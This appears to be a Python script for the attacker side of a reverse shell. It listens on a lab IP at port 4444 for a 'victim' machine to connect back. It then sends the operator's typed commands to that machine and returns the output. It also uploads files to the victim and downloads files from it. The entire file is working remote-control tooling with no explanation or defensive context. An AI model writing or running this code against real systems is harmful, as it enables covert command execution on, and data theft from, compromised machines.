import socket,json,os,base64,sys,traceback

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+]Waiting for incoming connections....")
        self.connection,vic_address=listener.accept()
        print("[+]Got a connection from"+str(vic_address))

    def reliable_send(self, data):
        json_data=json.dumps(data)
        self.connection.send(json_data.encode())


    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())


    def write_file(self,path,content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+]Successfully downloaded"


    '''def reliable_receive(self, data):
        json_data= self.connection.recv(1024)
        return json.loads(json_data)'''
    def reliable_receive(self):
        json_data=b""
        while True:
            try:
                json_data+= self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def exec_remotely(self,command):
        self.reliable_send(command)
        if command[0]=="exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">>")
            command = command.split(" ")
            # try:
            if command[0] == "upload":
                file_content=self.read_file(command[1]).decode()
                command.append(file_content)
            command_output = self.exec_remotely(command)
            if command[0] == "download" and "[-] Error" not in command_output:
                command_output=self.write_file(command[1],command_output)
            # except Exception:
            # 	command_output="[-]Error during command execution."
            print(command_output)


listener = Listener("192.168.56.101",4444)
listener.run()

